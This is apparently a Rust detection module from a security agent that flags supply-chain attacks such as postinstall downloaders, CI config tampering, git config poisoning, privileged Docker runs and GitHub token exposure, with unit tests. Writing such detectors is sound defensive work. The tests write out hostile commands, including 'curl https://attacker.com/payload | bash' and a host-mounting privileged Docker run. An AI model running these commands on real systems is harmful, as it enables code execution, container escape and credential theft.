/// Developer / Supply Chain Attack Detection — Tranche 3 Upgrade 5
///
/// Detects npm/pip/cargo postinstall downloaders, CI/CD config tampering,
/// git config poisoning, Docker socket abuse, GitHub token extraction,
/// and suspicious npm script execution from node_modules.
///
/// MITRE coverage:
///   T1195.001 — Supply Chain Compromise: Compromise Software Dependencies
///   T1195.002 — Supply Chain Compromise: Compromise Software Supply Chain
///   T1552.001 — Unsecured Credentials: Credentials in Files
///   T1611    — Escape to Host (Docker socket)
use crate::models::{AlertSeverity, ProcessInfo, TelemetryEvent};
use chrono::DateTime;
use chrono::Utc;
use serde_json::json;
use std::path::Path;

fn supply_chain_alert(
    now: DateTime<Utc>,
    event_type: &str,
    mitre: &str,
    severity: AlertSeverity,
    reason: &str,
    process: &ProcessInfo,
    trigger: &str,
) -> TelemetryEvent {
    TelemetryEvent::new(
        now,
        event_type,
        "core-agent/supply-chain",
        json!({
            "severity": severity.as_str(),
            "score": severity.score(),
            "category": "supply_chain",
            "reason": reason,
            "details": {
                "pid": process.pid,
                "ppid": process.ppid,
                "command": process.command,
                "args": process.args,
                "process_kind": process.process_kind,
                "parent_command": process.parent_command,
                "parent_process_kind": process.parent_process_kind,
                "trigger": trigger,
                "mitre_technique": mitre,
                "confidence": "high",
            }
        }),
    )
}

/// Known typosquatted / malicious package name fragments.
/// Keep focused on confirmed cases and high-signal patterns.
const TYPOSQUATTED_PACKAGES: &[&str] = &[
    "crossenv", "event-stream-fix", "eslint-config-airbnb-fix",
    "electron-native-notify", "flatmap-stream", "discord.js-fix",
    "node-fetch-fix", "request-promise-fix", "lodash-util",
    "logkitty", "babelcli", "colourama", "urllib2", "python3-requests",
    "python-dateutil2", "pypiwin32-fix",
];

/// Detect supply chain attack patterns from a ProcessInfo.
pub fn detect_supply_chain(process: &ProcessInfo, now: DateTime<Utc>) -> Vec<TelemetryEvent> {
    let mut alerts = Vec::new();

    let cmd_basename = Path::new(&process.command)
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("")
        .to_ascii_lowercase();
    let args_lower = process.args.to_ascii_lowercase();
    let parent_cmd = process.parent_command.as_deref().unwrap_or("").to_ascii_lowercase();
    let parent_kind = process.parent_process_kind.as_deref().unwrap_or("");
    let parent_basename = Path::new(&parent_cmd)
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("")
        .to_ascii_lowercase();

    // ── Package postinstall downloading ───────────────────────────────────────

    // Shell (bash/sh/zsh) spawned by npm/pip/pip3/cargo during install
    // with a download command in args — classic postinstall backdoor
    let is_shell = matches!(cmd_basename.as_str(), "bash" | "sh" | "zsh" | "dash");
    let parent_is_package_mgr = matches!(
        parent_basename.as_str(),
        "npm" | "yarn" | "pnpm" | "pip" | "pip3" | "cargo" | "gem" | "bundler"
    ) || parent_cmd.contains("node_modules/.bin/");

    if is_shell && parent_is_package_mgr {
        let has_download = args_lower.contains("curl")
            || args_lower.contains("wget")
            || args_lower.contains("fetch")
            || (args_lower.contains("python") && args_lower.contains("urllib"))
            || args_lower.contains("requests.get");
        if has_download {
            alerts.push(supply_chain_alert(
                now,
                "alert_package_postinstall_download",
                "T1195.002",
                AlertSeverity::Critical,
                "Package postinstall script spawned shell with download command — supply chain backdoor",
                process,
                "postinstall_download",
            ));
        }
    }

    // Node.js spawning a shell with download args (node running postinstall JS)
    if (cmd_basename == "node" || cmd_basename == "node.js")
        && parent_is_package_mgr
        && (args_lower.contains("curl") || args_lower.contains("wget")
            || args_lower.contains("child_process") || args_lower.contains("exec("))
    {
        alerts.push(supply_chain_alert(
            now,
            "alert_package_postinstall_download",
            "T1195.002",
            AlertSeverity::Critical,
            "Node.js postinstall script executing download or shell command — supply chain backdoor",
            process,
            "node_postinstall_download",
        ));
    }

    // ── Typosquatted package names ────────────────────────────────────────────

    if (cmd_basename == "npm" || cmd_basename == "pip" || cmd_basename == "pip3") {
        let is_install = args_lower.starts_with("install") || args_lower.contains(" install ");
        if is_install {
            if TYPOSQUATTED_PACKAGES.iter().any(|pkg| args_lower.contains(pkg)) {
                alerts.push(supply_chain_alert(
                    now,
                    "alert_typosquatting_package",
                    "T1195.001",
                    AlertSeverity::High,
                    "Known typosquatted or malicious package being installed",
                    process,
                    "typosquatted_package",
                ));
            }
        }
    }

    // ── CI/CD config modification ─────────────────────────────────────────────

    let ci_config_paths = [
        ".github/workflows/", ".gitlab-ci.yml", "jenkinsfile",
        "circleci/config.yml", ".travis.yml", "bitbucket-pipelines.yml",
        "azure-pipelines.yml", "buildspec.yml", ".drone.yml",
    ];

    let modifying_cmds = ["vi", "vim", "nano", "echo", "tee", "sed", "python", "python3", "node"];
    if modifying_cmds.iter().any(|c| cmd_basename == *c) {
        if ci_config_paths.iter().any(|p| args_lower.contains(p)) {
            // Only alert from interpreter/unknown chains (not interactive editor sessions from Terminal)
            if parent_kind == "interpreter" || parent_kind == "unknown" {
                alerts.push(supply_chain_alert(
                    now,
                    "alert_ci_config_modified",
                    "T1552.001",
                    AlertSeverity::High,
                    "CI/CD pipeline configuration modified from interpreter chain — supply chain attack",
                    process,
                    "ci_config_write",
                ));
            }
        }
    }

    // ── Git config poisoning ──────────────────────────────────────────────────

    if cmd_basename == "git" {
        let is_global_config = args_lower.contains("--global") || args_lower.contains("--system");
        let is_dangerous_key = args_lower.contains("url.")
            || args_lower.contains("core.hookspath")
            || args_lower.contains("init.templatedir")
            || args_lower.contains("http.proxy")
            || args_lower.contains("credential.helper");
        if is_global_config && is_dangerous_key {
            alerts.push(supply_chain_alert(
                now,
                "alert_git_config_poisoning",
                "T1195.001",
                AlertSeverity::High,
                "git --global config setting URL, hook path, or credential helper — supply chain attack",
                process,
                "git_config_poison",
            ));
        }
    }

    // ── Docker socket abuse ───────────────────────────────────────────────────

    if cmd_basename == "docker" || cmd_basename == "docker-compose" {
        // docker run/exec with host mounts or privileged mode from interpreter chain
        let is_privileged = args_lower.contains("--privileged")
            || args_lower.contains("-v /:/") || args_lower.contains("-v /var/run/docker.sock")
            || args_lower.contains("--pid=host") || args_lower.contains("--network=host");
        if is_privileged && (parent_kind == "interpreter" || parent_kind == "unknown") {
            alerts.push(supply_chain_alert(
                now,
                "alert_docker_socket_access",
                "T1611",
                AlertSeverity::Critical,
                "Docker run with privileged flags or host socket mount from interpreter — container escape",
                process,
                "docker_privileged",
            ));
        }
    }

    // ── GitHub token extraction ───────────────────────────────────────────────

    let github_token_patterns = [
        "github_token", "github_pat", "github_access_token",
        "gh_token", "ghp_", "gho_", "ghu_", "ghs_",
    ];

    // echo/env/printenv printing GitHub tokens
    if matches!(cmd_basename.as_str(), "echo" | "printenv" | "env" | "printf") {
        if github_token_patterns.iter().any(|t| args_lower.contains(t)) {
            alerts.push(supply_chain_alert(
                now,
                "alert_github_token_extraction",
                "T1552.001",
                AlertSeverity::Critical,
                "GitHub token being printed or exported — credential theft in CI/CD context",
                process,
                "github_token_print",
            ));
        }
    }

    // curl/wget using $GITHUB_TOKEN in Authorization header
    if (cmd_basename == "curl" || cmd_basename == "wget")
        && github_token_patterns.iter().any(|t| args_lower.contains(t))
    {
        alerts.push(supply_chain_alert(
            now,
            "alert_github_token_extraction",
            "T1552.001",
            AlertSeverity::Critical,
            "GitHub token used in HTTP request — potential credential exfiltration",
            process,
            "github_token_http",
        ));
    }

    // ── npm script suspicious execution from node_modules ────────────────────

    if (cmd_basename == "node" || is_shell) && process.command.contains("node_modules") {
        // node_modules/.bin scripts launching shells or downloaders
        let has_suspicious_action = args_lower.contains("curl")
            || args_lower.contains("wget")
            || args_lower.contains("exec")
            || args_lower.contains("child_process")
            || (is_shell && args_lower.contains("-c"));
        if has_suspicious_action && (parent_kind == "interpreter" || parent_kind == "unknown") {
            alerts.push(supply_chain_alert(
                now,
                "alert_npm_script_suspicious_execution",
                "T1195.002",
                AlertSeverity::High,
                "Suspicious execution from node_modules — possible malicious npm package payload",
                process,
                "npm_script_suspicious",
            ));
        }
    }

    alerts
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::classify::classify_path;
    use crate::command_features::extract_features;
    use chrono::Utc;

    fn make_process(
        command: &str,
        args: &str,
        process_kind: &str,
        parent_kind: Option<&str>,
        parent_command: Option<&str>,
    ) -> ProcessInfo {
        ProcessInfo {
            pid: 4000,
            ppid: 500,
            command: command.to_string(),
            args: args.to_string(),
            process_kind: process_kind.to_string(),
            command_path_kind: classify_path(command),
            parent_command: parent_command.map(|s| s.to_string()),
            parent_args: None,
            parent_process_kind: parent_kind.map(|s| s.to_string()),
            parent_command_path_kind: None,
            behavior: extract_features(command, args),
        }
    }

    #[test]
    fn postinstall_download_fires_for_bash_from_npm_with_curl() {
        let now = Utc::now();
        let p = make_process(
            "/usr/bin/bash",
            "-c curl https://attacker.com/payload | bash",
            "interpreter",
            Some("interpreter"),
            Some("/usr/local/bin/npm"),
        );
        let alerts = detect_supply_chain(&p, now);
        assert!(
            alerts.iter().any(|e| e.event_type == "alert_package_postinstall_download"),
            "bash from npm with curl should fire postinstall download"
        );
    }

    #[test]
    fn typosquatting_fires_for_known_bad_package() {
        let now = Utc::now();
        let p = make_process(
            "/usr/local/bin/npm",
            "install crossenv",
            "user_app",
            Some("interpreter"),
            Some("/usr/bin/bash"),
        );
        let alerts = detect_supply_chain(&p, now);
        assert!(
            alerts.iter().any(|e| e.event_type == "alert_typosquatting_package"),
            "npm install crossenv should fire typosquatting alert"
        );
    }

    #[test]
    fn git_config_poisoning_fires_for_global_hookspath() {
        let now = Utc::now();
        let p = make_process(
            "/usr/bin/git",
            "config --global core.hooksPath /tmp/malicious-hooks",
            "user_app",
            Some("interpreter"),
            Some("/usr/bin/bash"),
        );
        let alerts = detect_supply_chain(&p, now);
        assert!(
            alerts.iter().any(|e| e.event_type == "alert_git_config_poisoning"),
            "git config --global core.hooksPath should fire"
        );
    }

    #[test]
    fn docker_privileged_from_interpreter_fires() {
        let now = Utc::now();
        let p = make_process(
            "/usr/local/bin/docker",
            "run --privileged -v /:/host ubuntu bash",
            "user_app",
            Some("interpreter"),
            Some("/usr/bin/python3"),
        );
        let alerts = detect_supply_chain(&p, now);
        assert!(
            alerts.iter().any(|e| e.event_type == "alert_docker_socket_access"),
            "docker --privileged from interpreter should fire"
        );
    }

    #[test]
    fn github_token_echo_fires() {
        let now = Utc::now();
        let p = make_process(
            "/bin/echo",
            "GITHUB_TOKEN=ghp_abc123xyzabc123xyzabc",
            "user_app",
            Some("interpreter"),
            Some("/usr/bin/bash"),
        );
        let alerts = detect_supply_chain(&p, now);
        assert!(
            alerts.iter().any(|e| e.event_type == "alert_github_token_extraction"),
            "echo of GITHUB_TOKEN should fire"
        );
    }

    #[test]
    fn ci_config_modified_from_interpreter_fires() {
        let now = Utc::now();
        let p = make_process(
            "/usr/bin/tee",
            ".github/workflows/deploy.yml",
            "user_app",
            Some("interpreter"),
            Some("/usr/bin/bash"),
        );
        let alerts = detect_supply_chain(&p, now);
        assert!(
            alerts.iter().any(|e| e.event_type == "alert_ci_config_modified"),
            "tee to .github/workflows/ from interpreter should fire"
        );
    }

    #[test]
    fn normal_npm_install_does_not_fire() {
        let now = Utc::now();
        let p = make_process(
            "/usr/local/bin/npm",
            "install lodash",
            "user_app",
            Some("user_app"),
            Some("/Applications/Terminal.app/Contents/MacOS/Terminal"),
        );
        let alerts = detect_supply_chain(&p, now);
        assert!(
            alerts.is_empty(),
            "Normal npm install lodash should not fire any supply chain alerts"
        );
    }
}
